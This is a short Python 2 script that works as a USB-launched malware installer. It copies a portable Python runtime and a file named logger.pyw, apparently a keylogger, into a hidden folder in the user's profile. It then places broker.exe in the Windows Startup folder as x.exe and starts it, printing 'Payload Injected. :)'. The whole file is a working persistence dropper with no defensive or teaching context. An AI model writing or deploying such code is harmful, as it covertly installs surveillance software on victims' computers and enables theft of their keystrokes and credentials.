import shutil, getpass, os, sys
print __file__
user=getpass.getuser()
driveLetter = os.path.dirname(os.path.realpath(__file__)).split("\\")[0] + "/"
def copytree(src, dst, symlinks=False, ignore=None):
    for item in os.listdir(src):
        s = os.path.join(src, item)
        d = os.path.join(dst, item)
        if os.path.isdir(s):
            shutil.copytree(s, d, symlinks, ignore)
        else:
            shutil.copy2(s, d)
def copy(src, dst):
    shutil.copy2(src, dst)

print "Begining Payload Instalation..."
print "Installing Portable Python Libraries..."
if not os.path.exists("C:/Users/"+user+"/.idlerc/Python27"):
    os.makedirs("C:/Users/"+user+"/.idlerc/Python27")
copytree(driveLetter + "Private/Python27", "C:/Users/"+user+"/.idlerc/Python27")
print "Installing Payload..."
copy(driveLetter + "Private/logger.pyw", "C:/Users/"+user+"/.idlerc/x.pyw")
print "Installing Startup Broker..."
copy(driveLetter + "Private/broker.exe", "C:/Users/"+user+"/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/x.exe")
print "Payload Injected. :)"
print "Starting Payload Now"
os.startfile('C:/Users/' + user + '/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/x.exe')
print "payload Has Completely Injected"
